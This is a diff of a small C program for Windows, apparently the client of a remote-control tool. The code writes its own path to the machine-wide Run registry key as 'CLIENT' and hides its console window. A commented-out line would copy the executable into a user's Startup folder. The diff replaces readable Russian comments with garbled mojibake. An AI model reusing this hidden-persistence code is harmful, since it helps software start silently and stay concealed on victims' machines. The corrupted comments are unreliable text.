@@ -15,13 +15,13 @@ void add_to_reg() {
     DWORD path = 0;
     char IpFilename[MAX_PATH];
     HKEY hKey;
-    //  Получение пути файла
+    //  РџРѕР»СѓС‡РµРЅРёРµ РїСѓС‚Рё С„Р°Р№Р»Р°
     path = GetModuleFileNameA(NULL, IpFilename, sizeof(IpFilename));
-    //  Занесение в реестр
+    //  Р—Р°РЅРµСЃРµРЅРёРµ РІ СЂРµРµСЃС‚СЂ
     RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey); 
 
     DWORD pathlen = path * sizeof(*IpFilename);
-    //  Добавление значения в реестр
+    //  Р”РѕР±Р°РІР»РµРЅРёРµ Р·РЅР°С‡РµРЅРёСЏ РІ СЂРµРµСЃС‚СЂ
     RegSetValueExA(hKey, "CLIENT", NULL, REG_SZ, (LPBYTE)IpFilename, pathlen);
 
     RegCloseKey(hKey);
@@ -30,7 +30,7 @@ void add_to_reg() {
 
 int main(void)
 {   
-    //  Скрытие окна
+    //  РЎРєСЂС‹С‚РёРµ РѕРєРЅР°
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
     //system("copy \"C:\\Users\\puuni\\Downloads\\myclient.exe\" \"C:\\Users\\puuni\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
